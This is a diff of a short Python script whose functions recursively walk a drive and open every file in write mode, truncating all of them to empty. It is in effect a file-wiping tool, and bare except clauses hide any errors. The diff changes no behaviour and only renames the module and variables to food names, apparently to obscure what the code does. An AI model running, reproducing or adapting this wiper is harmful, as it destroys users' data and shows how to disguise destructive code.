@@ -1,7 +1,7 @@
-import os
+import os as shrimp
 def eat(path):
-    if os.path.exists(path):
-        if os.path.isfile(path):
+    if shrimp.path.exists(path):
+        if shrimp.path.isfile(path):
             try:
                 spaghetti = open (path, "w")
                 spaghetti.close()
@@ -13,10 +13,10 @@ def eat(path):
         print ("path doesnt exist")
 
 def Gorge(abs_drive):
-    for root, dirs, files in os.walk(abs_drive):
-        for name in files:
+    for watermelon, macaroni, cookies in shrimp.walk(abs_drive):
+        for rice in cookies:
                 try:
-                	t = os.path.join(root,name)
-                    eat(t)
+                	sandwich = shrimp.path.join(watermelon,rice)
+                	eat(sandwich)
                 except:
                         pass
